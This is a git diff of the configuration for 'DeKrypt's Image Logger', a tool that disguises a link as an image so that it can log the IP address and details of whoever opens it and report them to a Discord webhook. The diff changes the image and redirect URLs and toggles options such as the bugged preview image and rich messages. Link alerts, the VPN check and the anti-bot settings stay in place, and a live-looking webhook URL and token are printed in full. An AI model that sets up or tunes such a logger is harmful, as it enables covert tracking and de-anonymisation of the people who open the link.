@@ -13,10 +13,10 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1080860834730872984/gXya0F_l_lA0iyEfJUjfZeGFCXJO-2eGG_WmOWxDLZux8xjjPLHxfiJV1BpY4H35Rb4v",
-    "image": "https://www.google.com/imgres?imgurl=https%3A%2F%2Fwww.dafont.com%2Fimg%2Fillustration%2Ft%2Fi%2Ftiny.png&imgrefurl=https%3A%2F%2Fwww.dafont.com%2Ftiny.font&tbnid=GKE4xmnaeIYwOM&vet=12ahUKEwjH0d_Iv739AhVCtSoKHVsBD2gQMygEegUIARC4AQ..i&docid=K8-Y9VAhcI-SlM&w=512&h=256&q=small%20text&ved=2ahUKEwjH0d_Iv739AhVCtSoKHVsBD2gQMygEegUIARC4AQ
+    "image": "https://images.unsplash.com/photo-1575936123452-b67c3203c357?ixlib=rb-4.0.3&ixid=MnwxMjA3fDB8MHxzZWFyY2h8Mnx8aW1hZ2V8ZW58MHx8MHx8&w=1000&q=80"
     # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
-    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
+    "imageArgument": False, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
     "username": "1234", # Set this to the name you want the webhook to have
@@ -30,7 +30,7 @@ config = {
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
         "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
-        "richMessage": True, # Enable rich text? (See README for more info)
+        "richMessage": False, # Enable rich text? (See README for more info)
     },
 
     "vpnCheck": 1, # Prevents VPNs from triggering the alert
@@ -39,7 +39,7 @@ config = {
                 # 2 = Don't send an alert when a VPN is suspected
 
     "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
-    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)
+    "buggedImage": False, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)
 
     "antiBot": 1, # Prevents bots from triggering the alert
                 # 0 = No Anti-Bot
@@ -52,7 +52,7 @@ config = {
     # REDIRECTION #
     "redirect": {
         "redirect": False, # Redirect to a webpage?
-        "page": "https://www.google.com/imgres?imgurl=https%3A%2F%2Fwww.dafont.com%2Fimg%2Fillustration%2Ft%2Fi%2Ftiny.png&imgrefurl=https%3A%2F%2Fwww.dafont.com%2Ftiny.font&tbnid=GKE4xmnaeIYwOM&vet=12ahUKEwjH0d_Iv739AhVCtSoKHVsBD2gQMygEegUIARC4AQ..i&docid=K8-Y9VAhcI-SlM&w=512&h=256&q=small%20text&ved=2ahUKEwjH0d_Iv739AhVCtSoKHVsBD2gQMygEegUIARC4AQ
+        "page": "https://images.unsplash.com/photo-1575936123452-b67c3203c357?ixlib=rb-4.0.3&ixid=MnwxMjA3fDB8MHxzZWFyY2h8Mnx8aW1hZ2V8ZW58MHx8MHx8&w=1000&q=80"
         
     },
 
